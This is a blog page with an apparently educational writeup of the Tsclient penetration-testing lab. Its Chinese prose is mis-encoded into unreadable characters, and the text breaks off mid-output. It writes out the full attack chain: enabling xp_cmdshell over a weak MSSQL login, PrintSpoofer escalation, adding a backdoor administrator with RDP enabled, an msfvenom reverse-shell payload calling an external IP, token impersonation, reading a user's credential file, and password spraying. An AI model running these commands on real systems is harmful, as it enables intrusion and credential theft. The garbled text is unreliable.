<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, æ¸—é€, æ˜¥ç§‹äº‘é•œ">
<meta name="description" content="Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3fcf74ad9d359e0c6c3d2b51a42f684a692fd9cd053c3829756ad5f3e4c4649b.css" integrity="sha256-P890rZ01ngxsPStRpC9oSmkv2c0FPDgpdWrV8&#43;TEZJs=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup">
  <meta property="og:description" content="Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-03-12T22:03:55+08:00">
    <meta property="article:modified_time" content="2025-03-12T22:03:55+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="æ¸—é€">
    <meta property="article:tag" content="æ˜¥ç§‹äº‘é•œ">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup">
<meta name="twitter:description" content="Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup",
      "item": "http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup",
  "name": "æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup",
  "description": "Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\n",
  "keywords": [
    "writeup", "æ¸—é€", "æ˜¥ç§‹äº‘é•œ"
  ],
  "articleBody": "Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\nå‚è€ƒæ–‡ç« \næ˜¥ç§‹äº‘é•œ TSclient â€“ Walkthrough - KingBridge - åšå®¢å›­\næ˜¥ç§‹äº‘å¢ƒ Tsclient | åˆé›¶Â·b10g~ğŸ¥\nFLAG1 å…ˆç”¨fscanæ‰«ä¸€ä¸‹\nmssqlæœåŠ¡æ˜¯å¼±å£ä»¤\nsa/1qaz!QAZ ç”¨æ•°æ®åº“ç®¡ç†å·¥å…·è¿ä¸Šå»\næ¥ä¸‹æ¥è¦çœ‹mssqlæ€ä¹ˆè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/7129\nåˆ¤æ–­xp_cmdshellçŠ¶æ€\nselect * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell' å­˜åœ¨\né‚£æˆ‘ä»¬æ¥ä¸‹æ¥å¯åŠ¨å®ƒ\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; é…ç½®é€‰é¡¹ 'xp_cmdshell' å·²ä» 0 æ›´æ”¹ä¸º 1ã€‚è¯·è¿è¡Œ RECONFIGURE è¯­å¥è¿›è¡Œå®‰è£…ã€‚ å¯åŠ¨æˆåŠŸ\næ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†\nexec master..xp_cmdshell 'whoami' æ¥ä¸‹æ¥ç›´æ¥vshellä¸€å¥è¯ä¸Šçº¿\næ²¡æ‰¾åˆ°flagï¼Œå‘ç°Administratoræ–‡ä»¶å¤¹æ²¡æœ‰æƒé™\næƒ³åˆ°è¦ææƒï¼Œä¼ ä¸€ä¸ªPrintSpooferè¿›è¡Œææƒ\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd ææƒä¹‹åæ‹¿åˆ°flag\n1C:\\Tmp\u003etype C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... ææƒä¹‹åç”¨ææƒåçš„è´¦æˆ·é‡æ–°ä¸Šä¸€ä¸‹çº¿\næ¥ä¸‹æ¥ç”¨fscanæ‰«ä¸€ä¸‹å†…ç½‘\n1â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” 2â”‚ ___ _ â”‚ 3â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚ 4â”‚ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / â”‚ 5â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c â”‚ 6â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚ 7â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1 11[2025-03-09 19:53:19] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ 12[2025-03-09 19:53:19] [INFO] CIDRèŒƒå›´: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] è§£æCIDR 172.22.8.0/24 -\u003e IPèŒƒå›´ 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256 16[2025-03-09 19:53:20] [INFO] å¼€å§‹ä¸»æœºæ‰«æ 17[2025-03-09 19:53:20] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹... 18[2025-03-09 19:53:20] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ… 19[2025-03-09 19:53:20] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹... 20[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.31 å­˜æ´» (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.18 å­˜æ´» (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.15 å­˜æ´» (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.46 å­˜æ´» (ICMP) 24[2025-03-09 19:53:23] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4 25[2025-03-09 19:53:23] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233 26[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:88 =\u003e 44[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:80 =\u003e [http] 45[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:80 =\u003e [http] 46[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:139 =\u003e Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:139 =\u003e Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:139 =\u003e Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:139 =\u003e Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:445 =\u003e 51[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:445 =\u003e 52[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:445 =\u003e 53[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:445 =\u003e 54[2025-03-09 19:53:31] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:1433 =\u003e [ms-sql-s] ç‰ˆæœ¬:13.00.1601 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:389 =\u003e 56[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:135 =\u003e 57[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:135 =\u003e 58[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:135 =\u003e 59[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:135 =\u003e 60[2025-03-09 19:54:29] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 17 61[2025-03-09 19:54:30] [INFO] å¼€å§‹æ¼æ´æ‰«æ 62[2025-03-09 19:54:30] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 64ç›®æ ‡ä¸»æœº: 172.22.8.18 65ä¸»æœºå: WIN-WEB 66å‘ç°çš„ç½‘ç»œæ¥å£: 67 IPv4åœ°å€: 68 â””â”€ 172.22.8.18 69 IPv6åœ°å€: 70 â””â”€ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 73ç›®æ ‡ä¸»æœº: 172.22.8.15 74ä¸»æœºå: DC01 75å‘ç°çš„ç½‘ç»œæ¥å£: 76 IPv4åœ°å€: 77 â””â”€ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 79ç›®æ ‡ä¸»æœº: 172.22.8.46 80ä¸»æœºå: WIN2016 81å‘ç°çš„ç½‘ç»œæ¥å£: 82 IPv4åœ°å€: 83 â””â”€ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 85ç›®æ ‡ä¸»æœº: 172.22.8.31 86ä¸»æœºå: WIN19-CLIENT 87å‘ç°çš„ç½‘ç»œæ¥å£: 88 IPv4åœ°å€: 89 â””â”€ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.46 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.18 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] æ‰«æå·²å®Œæˆ: 32/32 æ‰«åˆ°ä¸‰å°æœºå­\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 æ²¡æœ‰ä»€ä¹ˆèƒ½ç›´æ¥åˆ©ç”¨çš„æœåŠ¡\né‚£æˆ‘ä»¬æ¥ç€ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nnet user ä¸»æœºå: WIN-WEB\rOS åç§°: Microsoft Windows Server 2016 Datacenter\rOS ç‰ˆæœ¬: 10.0.14393 æš‚ç¼º Build 14393\rOS åˆ¶é€ å•†: Microsoft Corporation\rOS é…ç½®: ç‹¬ç«‹æœåŠ¡å™¨\rOS æ„ä»¶ç±»å‹: Multiprocessor Free\ræ³¨å†Œçš„æ‰€æœ‰äºº:\ræ³¨å†Œçš„ç»„ç»‡: Aliyun\räº§å“ ID: 00376-40000-00000-AA947\råˆå§‹å®‰è£…æ—¥æœŸ: 2022/7/11, 12:46:14\rç³»ç»Ÿå¯åŠ¨æ—¶é—´: 2025/3/9, 18:28:29\rç³»ç»Ÿåˆ¶é€ å•†: Alibaba Cloud\rç³»ç»Ÿå‹å·: Alibaba Cloud ECS\rç³»ç»Ÿç±»å‹: x64-based PC\rå¤„ç†å™¨: å®‰è£…äº† 1 ä¸ªå¤„ç†å™¨ã€‚\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS ç‰ˆæœ¬: SeaBIOS 449e491, 2014/4/1\rWindows ç›®å½•: C:\\Windows\rç³»ç»Ÿç›®å½•: C:\\Windows\\system32\rå¯åŠ¨è®¾å¤‡: \\Device\\HarddiskVolume1\rç³»ç»ŸåŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\rè¾“å…¥æ³•åŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\ræ—¶åŒº: (UTC+08:00) åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½\rç‰©ç†å†…å­˜æ€»é‡: 3,950 MB\rå¯ç”¨çš„ç‰©ç†å†…å­˜: 883 MB\rè™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 5,848 MB\rè™šæ‹Ÿå†…å­˜: å¯ç”¨: 1,169 MB\rè™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 4,679 MB\ré¡µé¢æ–‡ä»¶ä½ç½®: C:\\pagefile.sys\råŸŸ: WORKGROUP\rç™»å½•æœåŠ¡å™¨: æš‚ç¼º\rä¿®è¡¥ç¨‹åº: å®‰è£…äº† 6 ä¸ªä¿®è¡¥ç¨‹åºã€‚\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\rç½‘å¡: å®‰è£…äº† 1 ä¸ª NICã€‚\r[01]: Red Hat VirtIO Ethernet Adapter\rè¿æ¥å: ä»¥å¤ªç½‘\rå¯ç”¨ DHCP: æ˜¯\rDHCP æœåŠ¡å™¨: 172.22.255.253\rIP åœ°å€\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V è¦æ±‚: å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚ C:\\Tmp\u003enet user\r\\\\ çš„ç”¨æˆ·å¸æˆ·\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\rå‘½ä»¤è¿è¡Œå®Œæ¯•ï¼Œä½†å‘ç”Ÿä¸€ä¸ªæˆ–å¤šä¸ªé”™è¯¯ã€‚ C:\\Tmp\u003equser\rç”¨æˆ·å ä¼šè¯å ID çŠ¶æ€ ç©ºé—²æ—¶é—´ ç™»å½•æ—¶é—´\rjohn rdp-tcp#0 2 è¿è¡Œä¸­ 2:38 2025/3/9 18:30 å‘ç°ä¸€ä¸ªjohnç”¨æˆ·è¿œç¨‹è¿æ¥æœ¬å°æœºå­\nä¸ºäº†æ–¹ä¾¿å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·rdpè¿ä¸Šå»\nC:\\Tmp\u003enet user xrntkk Abc20060201 /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u003enet localgroup administrators xrntkk /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u003eREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\ræ“ä½œæˆåŠŸå®Œæˆã€‚ ç®¡ç†å‘˜æƒé™å¯ä»¥å·RDPç”¨æˆ·çš„tokenï¼Œä»è€ŒæŸ¥çœ‹å…¶æŒ‚è½½çš„ç›˜ã€‚\nè¿™é‡Œå¯ä»¥ç”¨msfçš„incognitoæ¨¡å—\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe å…ˆç”¨msfä¸Šä¸ªçº¿\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit ä¸Šçº¿\næ¥ç€ç”¨incognitoæ¨¡å—å·Johnçš„token\n1meterpreter \u003e use incognito 2Loading extension incognito...Success. 3meterpreter \u003e list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available å¯ä»¥çœ‹åˆ°å·²ç»æ‹¿åˆ°Johnçš„tokenäº†\nä»¥Johnçš„èº«ä»½è¿è¡Œcmd\n1meterpreter \u003e impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u003e shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u003ewhoami 10whoami 11win-web\\john net use çœ‹ä¸€ä¸‹æŒ‚è½½æƒ…å†µï¼ˆä¸çŸ¥é“ä¸ºå•¥æˆ‘è¿™ä¹±ç äº†ï¼‰\næŒ‚è½½äº†cç›˜\næŸ¥çœ‹cç›˜ä¸­çš„credential.txtæ–‡ä»¶\nC:\\Tmp\u003etype \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? è¿™é‡Œæœ‰ä¸€ä¸²è´¦å·å¯†ç ï¼Œç”¨è¿™ä¸²è´¦å·å¯†ç è¿›è¡Œä¸€ä¸ªå¯†ç å–·æ´’\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# â”Œâ”€â”€(rootã‰¿Xrntkk-Laptop)-[/home/xrntkk]\râ””â”€# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) 